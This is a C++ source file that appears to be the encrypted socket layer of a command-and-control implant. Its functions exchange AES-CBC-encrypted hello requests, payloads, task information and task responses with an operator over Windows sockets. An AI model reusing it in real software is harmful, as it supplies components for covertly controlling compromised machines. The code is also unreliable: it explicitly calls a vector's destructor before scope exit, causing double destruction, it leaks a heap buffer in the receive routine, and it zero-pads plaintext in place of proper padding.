#include <AES.h>
#include <Windows.h>
#include <iostream>
#include <vector>
#include <resp_builder.hpp>
#include <module_context.h>
#pragma comment(lib, "ws2_32.lib")
void send_encrypted(std::vector<UCHAR> key, std::vector<UCHAR> iv, SOCKET s, char* buffer, int len) {
	AES aes(AESKeyLength::AES_256);
	std::vector<UCHAR> vec_data(buffer, buffer + len);
	while (vec_data.size() % 16 != 0 || vec_data.size() == 0) {
		vec_data.resize(vec_data.size() + 1);
	}
	auto data = aes.EncryptCBC(vec_data, key, iv);
	send(s, (const char*)data.data(), data.size(), 0);
	data.~vector();
	return;
}
void send_encrypted_sized(std::vector<UCHAR> key, std::vector<UCHAR> iv, SOCKET s, char* buffer, int len) {
	AES aes(AESKeyLength::AES_256);
	std::vector<UCHAR> vec_data(buffer, buffer + len);
	while (vec_data.size() % 16 != 0 || vec_data.size() == 0) {
		vec_data.resize(vec_data.size() + 1);
	}
	auto data = aes.EncryptCBC(vec_data, key, iv);
	int t = data.size();
	data.insert(data.begin(), (t & 0xff));
	data.insert(data.begin(), (t & 0xff00) >> 8);
	data.insert(data.begin(), (t & 0xff0000) >> 16);
	data.insert(data.begin(), (t & 0xff000000) >> 24);
	send(s, (const char*)data.data(), data.size(), 0);
	data.~vector();
	return;
}

void recv_encrypted(std::vector<UCHAR> key, std::vector<UCHAR> iv, SOCKET s, char* buffer, int len, int flag) {
	int original_len = len;
	while (len % 16 != 0 || len == 0) {
		len++;
	}
	char* buf = new char[len];

	if (recv(s, buf, len, flag) > 0)
	{
		AES aes(AESKeyLength::AES_256);
		std::vector<UCHAR> vec_data(buf, buf + len);
		auto data = aes.DecryptCBC(vec_data, key, iv);
		memcpy(buffer, data.data(), original_len);
		data.~vector();
	}
	return;
}

void send_encrypted_taskresponse(VOID *pctx, char* buffer, int len) {
	PMODULE_CONTEXT ctx = (PMODULE_CONTEXT)pctx;
	send_encrypted_sized(ctx->aes_key, ctx->iv, (SOCKET)ctx->conn_handle, buffer, len);
}

void recv_hellorequest(SOCKET s, char* buffer, int& size) {
	size = recv(s, buffer, size, 0);
}
void recv_payloadinfo(SOCKET s, char* buffer, int& size) {
	size = recv(s, buffer, size, 0);
}
void recv_payload(SOCKET s, char* buffer, int size) {
	size = recv(s, buffer, size, 0x8);
}
void send_hellorequest(SOCKET s, char* buffer, int size) {
	size = send(s, buffer, size, 0);
}

bool is_data_null(std::vector<UCHAR> data) {
	for (int i = 0; i < data.size(); i++)
	{
		if (data.at(i) != NULL) return false;
	}
	return true;
}
DWORD recv_encrypted_taskinfo(std::vector<UCHAR> aes_key, std::vector<UCHAR> iv, SOCKET s, std::vector<UCHAR> &data) {
	DWORD content_length = 0;
	int recv_bytes = recv(s, (char*)&content_length, sizeof(content_length), 0);
	if (recv_bytes < 0) return 0;
	content_length = _byteswap_ulong(content_length);
	data.resize(recv_bytes);
	if (recv_bytes && content_length) {
		data.resize(content_length);
		recv_encrypted(aes_key, iv, s, (char*)data.data(), content_length, 0x8);
	}
	return content_length;
}

void send_encrypted_taskresponse_big(VOID *pctx, std::vector<UCHAR> buffer, ResponseBuilder* builder) {
	PMODULE_CONTEXT ctx = (PMODULE_CONTEXT)pctx;
	builder->add_long(buffer.size());
	builder->add_str(std::string(buffer.data(), buffer.data() + buffer.size()));
	builder->padding(16);
	auto final_data = builder->build();
	send_encrypted_sized(ctx->aes_key, ctx->iv, (SOCKET)ctx->conn_handle, (char*)final_data.data(), final_data.size());
}
